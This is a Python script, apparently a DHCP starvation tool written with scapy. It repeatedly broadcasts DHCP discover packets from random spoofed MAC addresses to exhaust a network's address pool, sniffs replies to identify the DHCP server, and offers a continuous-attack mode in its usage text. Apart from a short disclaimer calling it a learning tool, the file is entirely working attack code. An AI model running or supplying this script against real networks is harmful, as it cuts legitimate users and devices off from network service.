#!/usr/bin/python3
# @Martin
import argparse
import textwrap
import sys
import time
from scapy.all import *
import binascii
import threading
import random

Version = "V3.0"
Logo='''  __  __                  _     _                    _____    _    _    _____   _____   __      __  ____         ___  
 |  \/  |                | |   (_)                  |  __ \  | |  | |  / ____| |  __ \  \ \    / / |___ \       / _ \ 
 | \  / |   __ _   _ __  | |_   _   _ __    ______  | |  | | | |__| | | |      | |__) |  \ \  / /    __) |     | | | |
 | |\/| |  / _` | | '__| | __| | | | '_ \  |______| | |  | | |  __  | | |      |  ___/    \ \/ /    |__ <      | | | |
 | |  | | | (_| | | |    | |_  | | | | | |          | |__| | | |  | | | |____  | |         \  /     ___) |  _  | |_| |
 |_|  |_|  \__,_| |_|     \__| |_| |_| |_|          |_____/  |_|  |_|  \_____| |_|          \/     |____/  (_)  \___/                                                                                                                   
'''
Title='''Github==>https://github.com/MartinxMax\n<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任\n<Disclaimer>: 
This tool is only for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities'''


class DHCP_Server:
    def __init__(self,args):
        self.InterFace=args.interface
        self.Frequency=args.frequency
        self.DHCP_Server_IP=None
        self.DHCP_Mac=None


    def run(self):
        if self.InterFace and self.Probe_DHCP_Server():
            self.DHCP_Flood()


    def DHCP_Flood(self):
        while True:
            threading.Thread(target=self.DHCP_Server_Scanner).start()
            time.sleep(0.2)
            threading.Thread(target=self.DHCP_Depletion,args=(self.Frequency if self.Frequency != 0 else 10,)).start()
            if self.Frequency == 0:
                continue
            else:
                break
        return True


    def Probe_DHCP_Server(self):
        if self.DHCP_Depletion():
            INFO = self.DHCP_Server_Scanner(2)
            if INFO:
                self.DHCP_Server_IP=INFO[0]
                print(f"[+]DHCP Server Online ==> IP:{INFO[0]}\tMAC:{INFO[1]}")
                return True
            else:
                print("[!]DHCP Server Offline")
                return False
        else:
            print("[!]Send Pack Fail")
            return False


    def DHCP_Depletion(self,Frequency=1):
        for FAT in range(Frequency):
            mac_random = str(RandMAC())
            clien_mac_id = binascii.unhexlify(mac_random.replace(":", ''))
            dhcp_discover = Ether(src=mac_random, dst="FF:FF:FF:FF:FF:FF") / IP(src="0.0.0.0", dst="255.255.255.255") / \
                            UDP(sport=68, dport=67) / BOOTP(chaddr=clien_mac_id, xid=random.randint(1, 90000000)) / DHCP(
                options=[("message-type", "discover"), "end"])
            try:
                sendp(dhcp_discover, iface=self.InterFace,verbose=False)
            except:
                return False
        return True


    def DHCP_Server_Scanner(self,Flag=0):
        INFO_PACKET=None
        Last_IP=None
        try:
            INFO_PACKET = sniff(filter="dhcp and dst 255.255.255.255", iface=self.InterFace,timeout=2)
        except:
            pass
        if INFO_PACKET:
            if Flag == 2:
                    DHCP_IP = INFO_PACKET[1][1][0].src
                    DHCP_MAC=INFO_PACKET[1][0].src
                    FACK_User_IP = INFO_PACKET[1][0].src
                    FACK_User_MAC = INFO_PACKET[1][0].dst
                    return (DHCP_IP,DHCP_MAC,FACK_User_IP,FACK_User_MAC)
            else:
                for i in range(len(INFO_PACKET)):
                    try:
                        if self.DHCP_Server_IP.split(".")[0] in INFO_PACKET[i][1][0].dst:
                            if Last_IP != INFO_PACKET[i][1][0].dst:
                                print(f"[λ] From Server {self.DHCP_Server_IP} > Get IP:{INFO_PACKET[i][1][0].dst} ---[Success]")
                            Last_IP=INFO_PACKET[i][1][0].dst
                    except:
                        pass

                return True
        else:
            return False


def main():
    print(Logo,Title)
    parser = argparse.ArgumentParser(
        description=f'Martin_HDCP Tool ---Martin {Version}',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Usage:
            python3 %s -i eth0 -f (x) --> Specify the number of attacks
            python3 %s -i eth0 -f 0 --> Continuous attack
            ''' % (sys.argv[0],sys.argv[0])))
    parser.add_argument('-i', '--interface', default=None, help='Inter_face')
    parser.add_argument('-f', '--frequency', type=int,default=1, help='Frequency')
    args = parser.parse_args()
    DHCP_Server(args).run()


if __name__ == '__main__':
    main()